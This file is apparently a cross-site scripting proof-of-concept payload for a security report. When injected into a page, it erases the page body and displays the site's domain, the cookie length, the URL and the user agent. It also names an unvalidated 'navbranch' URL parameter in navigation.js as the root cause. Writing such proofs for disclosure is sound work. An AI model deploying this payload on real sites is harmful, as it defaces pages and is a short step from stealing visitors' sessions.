(function() {
  var d = document.domain;
  function inject() {
    if (!document.body) { setTimeout(inject, 50); return; }
    document.body.innerHTML = '';
    document.body.style.cssText = 'margin:0;background:#111;color:#0f0;font-family:monospace';
    var banner = document.createElement('div');
    banner.style.cssText = 'background:#c00;color:#fff;padding:30px;font-size:24px;text-align:center;font-family:sans-serif';
    banner.textContent = 'XSS PoC — Arbitrary JavaScript Execution on ' + d;
    document.body.appendChild(banner);
    var pre = document.createElement('pre');
    pre.style.cssText = 'padding:30px;font-size:16px;line-height:2';
    pre.textContent =
      '[1] document.domain = ' + d + '\n' +
      '[2] document.cookie = ' + document.cookie.length + ' bytes\n' +
      '[3] location.href   = ' + location.href + '\n' +
      '[4] navigator.userAgent = ' + navigator.userAgent.substring(0, 80) + '...';
    document.body.appendChild(pre);
    var info = document.createElement('div');
    info.style.cssText = 'padding:0 30px;font-size:14px;color:#888';
    info.innerHTML = 'This script was loaded from an attacker-controlled domain via the navbranch URL parameter.<br>Root cause: navigation.js line 123 — no validation on navbranch value.';
    document.body.appendChild(info);
  }
  inject();
})();
